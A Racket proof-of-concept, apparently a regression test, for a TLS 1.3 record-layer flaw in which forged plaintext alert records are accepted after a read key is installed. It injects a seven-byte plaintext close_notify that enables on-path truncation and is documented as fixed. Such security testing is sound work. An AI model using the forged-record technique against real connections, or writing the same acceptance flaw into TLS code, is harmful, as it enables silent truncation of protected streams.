#lang racket/base
;; PoC tls-proto P3: the TLS 1.3 record layer accepts UNAUTHENTICATED plaintext
;; records of type != 23 even AFTER a read key is installed. This is the core
;; primitive behind an on-path truncation attack (injected plaintext
;; close_notify alert) and a KeyUpdate/NST desync. RFC 8446 §5.1: once the
;; handshake keys are in place, a peer must not emit plaintext records other
;; than the middlebox-compat CCS; alerts and handshake messages are protected.
;;
;; Fixed (S1): after a read key is installed, any unprotected record other
;; than a middlebox-compat ChangeCipherSpec during the handshake is rejected
;; with unexpected_message; expected output is "record 2 REJECTED".
;;
;; We drive the library's own exported record layer (rktcrypto-tls13.rkt). We
;; install a read key, then feed two records through a pipe:
;;   (a) a genuine encrypted application_data record  -> decrypts fine
;;   (b) a forged *plaintext* alert record (type 21)   -> accepted verbatim,
;;       NOT rejected as bad_record_mac.
(require openssl/private/rktcrypto-tls13
         openssl/private/rktcrypto-ffi)

(define alg SHA256) (define aead AEAD-AES128-GCM)
(define key (make-bytes 16 7))
(define iv  (make-bytes 12 9))

(define-values (pin pout) (make-pipe))
(define r (make-rl pin pout))
;; install a receive key, as after a handshake
(rl-set-read-key! r aead key iv)

;; (a) write a genuine encrypted app-data record (seq 0) carrying "secret-data"
(define rec (tls13-seal aead key iv 0 (bytes-append #"secret-data" (bytes 23))))  ; inner = data || type 23
(write-bytes rec pout)

;; (b) forge a PLAINTEXT alert record: type=21, version=0303, len=2,
;; level=warning(1) desc=close_notify(0). No key, no tag -- pure attacker bytes.
(write-bytes (bytes 21 3 3 0 2 1 0) pout)
(flush-output pout)

(define-values (t1 p1) (rl-read-record r))
(printf "record 1: type=~a payload=~s  (decrypted real data)\n" t1 p1)

(with-handlers ([exn:fail? (lambda (e) (printf "record 2 REJECTED: ~a\n" (exn-message e)))])
  (define-values (t2 p2) (rl-read-record r))
  (printf "record 2: type=~a payload=~s  <-- forged PLAINTEXT alert ACCEPTED post-key\n" t2 p2)
  (when (= t2 21)
    (printf "RESULT: an on-path attacker's unauthenticated plaintext close_notify is delivered; ")
    (printf "the recv loop maps type 21 to EOF -> silent stream truncation.\n")))
